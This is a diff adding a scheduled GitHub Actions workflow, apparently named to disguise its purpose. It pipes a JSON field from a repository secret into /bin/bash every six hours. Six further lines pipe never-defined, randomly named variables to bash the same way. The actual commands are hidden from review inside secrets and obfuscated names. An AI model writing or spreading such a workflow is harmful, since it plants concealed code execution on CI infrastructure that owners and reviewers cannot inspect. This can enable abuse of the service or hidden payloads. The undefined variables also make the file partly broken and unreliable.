@@ -1,0 +1,22 @@
+name: washwealth
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: washwealth
+        env:
+          qgsj1: ${{ secrets.qgsj1 }}
+        run: |
+          echo $qgsj1 | jq -r .go87 | /bin/bash
+          echo $k909 | jq -r .ph38 | /bin/bash
+          echo $fzf169 | jq -r .kjw97 | /bin/bash
+          echo $j8415 | jq -r .ztrs698 | /bin/bash
+          echo $qifad2 | jq -r .laqvb1517 | /bin/bash
+          echo $x1096 | jq -r .orppd87 | /bin/bash
+          echo $vqew5 | jq -r .sag8 | /bin/bash
+
